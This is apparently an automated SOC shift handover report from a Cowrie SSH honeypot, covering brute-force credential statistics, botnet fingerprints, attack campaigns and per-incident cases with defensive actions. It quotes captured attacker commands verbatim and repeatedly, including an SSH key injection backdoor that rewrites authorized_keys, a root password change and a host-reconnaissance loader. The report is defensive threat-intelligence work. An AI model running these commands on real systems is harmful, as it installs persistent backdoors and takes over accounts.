# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-10-09 |
| **Generated At** | 2026-10-09T17:43:54Z |
| **Shift Time** | 17:43 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **304** |
| Confirmed Threats | **249** |
| False Positives Filtered | **55** (18.1%) |
| Unique Attacker IPs | **193** |
| Countries of Origin | **43** |
| High Severity Cases | **103** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **201** |
| Malware Samples Analyzed | **7** HIGH · **25** MED · 8 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **2375** |
| Unique Credential Pairs | **2217** |
| Unique Usernames | **1377** |
| Unique Passwords | **1144** |
| Successful Auth Pairs | **2285** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 154 |
| `345gs5662d34` | 48 |
| `admin` | 41 |
| `support` | 27 |
| `administrator` | 7 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 48 |
| `3245gs5662d34` | 47 |
| `support` | 27 |
| `admin` | 19 |
| `` | 14 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 48 |
| `support` | `support` | 26 |
| `root` | `3245gs5662d34` | 18 |
| `admin` | `admin` | 15 |
| `root` | `` | 14 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `lilei` | `123` | `61.29.254.109` | 2026-10-09T03:01:53 |
| `345gs5662d34` | `345gs5662d34` | `61.29.254.109` | 2026-10-09T03:01:57 |
| `lilei` | `3245gs5662d34` | `61.29.254.109` | 2026-10-09T03:01:59 |
| `root` | `123qwerty` | `195.178.110.228` | 2026-10-09T03:02:20 |
| `root` | `21` | `195.178.110.228` | 2026-10-09T03:03:57 |
| `root` | `321` | `195.178.110.228` | 2026-10-09T03:05:33 |
| `support` | `support` | `10.0.0.73` | 2026-10-09T03:06:01 |
| `root` | `4321` | `195.178.110.228` | 2026-10-09T03:07:05 |
| `root` | `54321` | `195.178.110.228` | 2026-10-09T03:08:36 |
| `root` | `P4ssw0rd` | `195.178.110.228` | 2026-10-09T03:10:05 |
| `root` | `P4ssword` | `195.178.110.228` | 2026-10-09T03:11:43 |
| `qwerty` | `qwerty` | `2.229.200.226` | 2026-10-09T03:11:46 |
| `root` | `P@ssw0rd` | `195.178.110.228` | 2026-10-09T03:13:21 |
| `root` | `Passw0rd` | `195.178.110.228` | 2026-10-09T03:15:00 |
| `root` | `letmein` | `195.178.110.228` | 2026-10-09T03:16:40 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.156.151.177` | 2026-10-09T03:17:23 |
| `*1` | `$4` | `34.156.151.177` | 2026-10-09T03:17:37 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 1260` | `34.156.151.177` | 2026-10-09T03:17:39 |
| `root` | `p4ssword` | `195.178.110.228` | 2026-10-09T03:18:21 |
| `root` | `p@ssw0rd` | `195.178.110.228` | 2026-10-09T03:20:07 |
_… 2265 more successful pair(s) in credentials.json_

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **304** |
| Sessions with Fingerprint | **25** |
| Unique HASSH Fingerprints | **25** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 88 |
| Go SSH scanner | 42 |
| Paramiko (Python) | 10 |
| PuTTY | 4 |
| Unknown | 3 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 63 | 32 |
| `2ec37a7cc8da...` | Mirai/variant | 8 | 3 |
| `eff4c24daffc...` | Modern SSH client | 6 | 1 |
| `084386fa7ae5...` | Mirai/variant | 5 | 5 |
| `0a07365cc01f...` | Generic scanner | 5 | 4 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 63 | 32 | Mirai/variant |
| `95420f9d932d...` | libssh | 20 | 13 | — |
| `2ec37a7cc8da...` | Go SSH scanner | 8 | 3 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 6 | 1 | Modern SSH client |
| `084386fa7ae5...` | Go SSH scanner | 5 | 5 | Mirai/variant |
| `0a07365cc01f...` | Go SSH scanner | 5 | 4 | Generic scanner |
| `a2de0f306611...` | Paramiko (Python) | 5 | 2 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 5 | 3 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **16** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1083, T1082` |
| **Recon Loader Script** | 🟡 MEDIUM | 127 | 3 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 28 | 26 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo -e "qwerty\nJSa9egXRpoh7\nJSa9egXRpoh7"|passwd|bash
```
```
Enter new UNIX password:
```
Source IPs: `49.207.245.148`, `2.229.200.226`

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `195.178.110.228`, `195.178.110.227`, `92.118.39.14`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `36.64.131.68`, `91.229.234.76`, `4.157.250.195`, `195.86.192.66`, `61.29.254.109`, `120.48.90.166`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **193** |
| Unique ASNs | **82** |
| High-Risk ASNs | **55** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 61 | HIGH |
| `AS4766` | Korea Telecom | 11 | HIGH |
| `AS213412` | ONYPHE SAS | 9 | LOW |
| `AS8075` | Microsoft Corporation | 7 | HIGH |
| `AS396982` | Google LLC | 6 | HIGH |
| `AS63949` | Akamai Connected Cloud | 5 | HIGH |
| `AS6939` | Hurricane Electric LLC | 4 | HIGH |
| `AS44382` | Fiba Cloud Operation Company, LLC | 4 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (103)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-40ad1d19f0b2

| Field | Detail |
|---|---|
| **Source IP** | `61.29.254[.]109` |
| **First Seen** | 2026-10-09 03:01 |
| **Last Seen** | 2026-10-09 03:01 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-09 03:01:52` | `cowrie.session.connect` |
| `2026-10-09 03:01:52` | `cowrie.client.version` |
| `2026-10-09 03:01:52` | `cowrie.client.kex` |
| `2026-10-09 03:01:53` | `cowrie.login.success` |
| `2026-10-09 03:01:54` | `cowrie.session.params` |
| `2026-10-09 03:01:54` | `cowrie.command.input` |
| `2026-10-09 03:01:54` | `cowrie.command.failed` |
| `2026-10-09 03:01:55` | `cowrie.log.closed` |
| `2026-10-09 03:01:55` | `cowrie.session.params` |
| `2026-10-09 03:01:55` | `cowrie.command.input` |
| `2026-10-09 03:01:56` | `cowrie.session.file_download` |
| `2026-10-09 03:01:56` | `cowrie.log.closed` |
| `2026-10-09 03:01:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.29.254[.]109` to AbuseIPDB if not already reported
- [ ] Block `61.29.254[.]109` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc0abf5797e0

| Field | Detail |
|---|---|
| **Source IP** | `61.29.254[.]109` |
| **First Seen** | 2026-10-09 03:01 |
| **Last Seen** | 2026-10-09 03:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-09 03:01:56` | `cowrie.session.connect` |
| `2026-10-09 03:01:56` | `cowrie.client.version` |
| `2026-10-09 03:01:56` | `cowrie.client.kex` |
| `2026-10-09 03:01:57` | `cowrie.login.success` |
| `2026-10-09 03:01:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.29.254[.]109` to AbuseIPDB if not already reported
- [ ] Block `61.29.254[.]109` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bdd810ace950

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-10-09 03:02 |
| **Last Seen** | 2026-10-09 03:02 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-09 03:02:17` | `cowrie.session.connect` |
| `2026-10-09 03:02:18` | `cowrie.client.version` |
| `2026-10-09 03:02:18` | `cowrie.client.kex` |
| `2026-10-09 03:02:20` | `cowrie.login.success` |
| `2026-10-09 03:02:21` | `cowrie.session.params` |
| `2026-10-09 03:02:21` | `cowrie.command.input` |
| `2026-10-09 03:02:21` | `cowrie.command.input` |
| `2026-10-09 03:02:21` | `cowrie.command.input` |
| `2026-10-09 03:02:21` | `cowrie.command.input` |
| `2026-10-09 03:02:21` | `cowrie.command.input` |
| `2026-10-09 03:02:21` | `cowrie.command.success` |
| `2026-10-09 03:02:21` | `cowrie.command.input` |
| `2026-10-09 03:02:21` | `cowrie.command.input` |
| `2026-10-09 03:02:21` | `cowrie.command.input` |
| `2026-10-09 03:02:21` | `cowrie.command.input` |
| … | _5 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ede60e461ec4

| Field | Detail |
|---|---|
| **Source IP** | `2.229.200[.]226` |
| **First Seen** | 2026-10-09 03:11 |
| **Last Seen** | 2026-10-09 03:12 |
| **Session Duration** | 45s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo -e "qwerty\nJSa9egXRpoh7\nJSa9egXRpoh7"|passwd|bash, Enter new UNIX password: ` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-09 03:11:45` | `cowrie.session.connect` |
| `2026-10-09 03:11:45` | `cowrie.client.version` |
| `2026-10-09 03:11:45` | `cowrie.client.kex` |
| `2026-10-09 03:11:46` | `cowrie.login.success` |
| `2026-10-09 03:11:47` | `cowrie.session.params` |
| `2026-10-09 03:11:47` | `cowrie.command.input` |
| `2026-10-09 03:11:47` | `cowrie.command.failed` |
| `2026-10-09 03:11:47` | `cowrie.log.closed` |
| `2026-10-09 03:11:48` | `cowrie.session.params` |
| `2026-10-09 03:11:48` | `cowrie.command.input` |
| `2026-10-09 03:11:48` | `cowrie.session.file_download` |
| `2026-10-09 03:11:48` | `cowrie.log.closed` |
| `2026-10-09 03:12:17` | `cowrie.session.params` |
| `2026-10-09 03:12:17` | `cowrie.command.input` |
| `2026-10-09 03:12:17` | `cowrie.log.closed` |
| … | _49 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `2.229.200[.]226` to AbuseIPDB if not already reported
- [ ] Block `2.229.200[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42de760d77c7

| Field | Detail |
|---|---|
| **Source IP** | `34.156.151[.]177` |
| **First Seen** | 2026-10-09 03:17 |
| **Last Seen** | 2026-10-09 03:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-09 03:17:23` | `cowrie.session.connect` |
| `2026-10-09 03:17:23` | `cowrie.login.success` |
| `2026-10-09 03:17:24` | `cowrie.session.params` |
| `2026-10-09 03:17:24` | `cowrie.command.input` |
| `2026-10-09 03:17:24` | `cowrie.command.input` |
| `2026-10-09 03:17:24` | `cowrie.command.failed` |
| `2026-10-09 03:17:24` | `cowrie.command.input` |
| `2026-10-09 03:17:24` | `cowrie.log.closed` |
| `2026-10-09 03:17:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.156.151[.]177` to AbuseIPDB if not already reported
- [ ] Block `34.156.151[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a55fbb85530a

| Field | Detail |
|---|---|
| **Source IP** | `34.156.151[.]177` |
| **First Seen** | 2026-10-09 03:17 |
| **Last Seen** | 2026-10-09 03:17 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-09 03:17:37` | `cowrie.session.connect` |
| `2026-10-09 03:17:37` | `cowrie.login.success` |
| `2026-10-09 03:17:37` | `cowrie.session.params` |
| `2026-10-09 03:17:37` | `cowrie.command.input` |
| `2026-10-09 03:17:37` | `cowrie.command.failed` |
| `2026-10-09 03:17:47` | `cowrie.log.closed` |
| `2026-10-09 03:17:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.156.151[.]177` to AbuseIPDB if not already reported
- [ ] Block `34.156.151[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8153582fdc84

| Field | Detail |
|---|---|
| **Source IP** | `34.156.151[.]177` |
| **First Seen** | 2026-10-09 03:17 |
| **Last Seen** | 2026-10-09 03:17 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-09 03:17:39` | `cowrie.session.connect` |
| `2026-10-09 03:17:39` | `cowrie.login.success` |
| `2026-10-09 03:17:39` | `cowrie.session.params` |
| `2026-10-09 03:17:39` | `cowrie.command.input` |
| `2026-10-09 03:17:47` | `cowrie.log.closed` |
| `2026-10-09 03:17:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.156.151[.]177` to AbuseIPDB if not already reported
- [ ] Block `34.156.151[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-124c9b68bd35

| Field | Detail |
|---|---|
| **Source IP** | `156.224.28[.]232` |
| **First Seen** | 2026-10-09 04:04 |
| **Last Seen** | 2026-10-09 04:05 |
| **Session Duration** | 77s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `id, cat /etc/passwd, echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A", enable, system` |
| **TTPs (MITRE)** | T1003.008 · T1021.004 · T1059.004 · T1078 · T1083 · T1105 · T1222.002 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-09 04:04:08` | `cowrie.session.connect` |
| `2026-10-09 04:04:10` | `cowrie.telnet.option` |
| `2026-10-09 04:04:12` | `cowrie.telnet.option` |
| `2026-10-09 04:04:12` | `cowrie.login.success` |
| `2026-10-09 04:04:13` | `cowrie.session.params` |
| `2026-10-09 04:04:18` | `cowrie.telnet.option` |
| `2026-10-09 04:04:18` | `cowrie.telnet.option` |
| `2026-10-09 04:04:18` | `cowrie.command.input` |
| `2026-10-09 04:04:18` | `cowrie.command.input` |
| `2026-10-09 04:04:18` | `cowrie.command.input` |
| `2026-10-09 04:04:21` | `cowrie.command.input` |
| `2026-10-09 04:04:21` | `cowrie.command.failed` |
| `2026-10-09 04:04:21` | `cowrie.command.input` |
| `2026-10-09 04:04:21` | `cowrie.command.failed` |
| `2026-10-09 04:04:21` | `cowrie.command.input` |
| … | _19 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `156.224.28[.]232` to AbuseIPDB if not already reported
- [ ] Block `156.224.28[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-edad34c9080e

| Field | Detail |
|---|---|
| **Source IP** | `103.253.245[.]102` |
| **First Seen** | 2026-10-09 04:09 |
| **Last Seen** | 2026-10-09 04:09 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-09 04:09:35` | `cowrie.session.connect` |
| `2026-10-09 04:09:35` | `cowrie.client.version` |
| `2026-10-09 04:09:36` | `cowrie.client.kex` |
| `2026-10-09 04:09:37` | `cowrie.login.success` |
| `2026-10-09 04:09:38` | `cowrie.session.params` |
| `2026-10-09 04:09:38` | `cowrie.command.input` |
| `2026-10-09 04:09:38` | `cowrie.command.failed` |
| `2026-10-09 04:09:39` | `cowrie.log.closed` |
| `2026-10-09 04:09:40` | `cowrie.session.params` |
| `2026-10-09 04:09:40` | `cowrie.command.input` |
| `2026-10-09 04:09:40` | `cowrie.session.file_download` |
| `2026-10-09 04:09:40` | `cowrie.log.closed` |
| `2026-10-09 04:09:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.253.245[.]102` to AbuseIPDB if not already reported
- [ ] Block `103.253.245[.]102` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d07b03d26672

| Field | Detail |
|---|---|
| **Source IP** | `103.253.245[.]102` |
| **First Seen** | 2026-10-09 04:09 |
| **Last Seen** | 2026-10-09 04:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-09 04:09:41` | `cowrie.session.connect` |
| `2026-10-09 04:09:41` | `cowrie.client.version` |
| `2026-10-09 04:09:41` | `cowrie.client.kex` |
| `2026-10-09 04:09:42` | `cowrie.login.success` |
| `2026-10-09 04:09:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.253.245[.]102` to AbuseIPDB if not already reported
- [ ] Block `103.253.245[.]102` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78fa08827cea

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-10-09 04:14 |
| **Last Seen** | 2026-10-09 04:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-09 04:14:52` | `cowrie.session.connect` |
| `2026-10-09 04:14:52` | `cowrie.client.version` |
| `2026-10-09 04:14:52` | `cowrie.client.kex` |
| `2026-10-09 04:14:52` | `cowrie.login.success` |
| `2026-10-09 04:14:52` | `cowrie.direct-tcpip.request` |
| `2026-10-09 04:14:53` | `cowrie.direct-tcpip.data` |
| `2026-10-09 04:14:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cfc44c98b798

| Field | Detail |
|---|---|
| **Source IP** | `64.225.72[.]42` |
| **First Seen** | 2026-10-09 04:20 |
| **Last Seen** | 2026-10-09 04:20 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

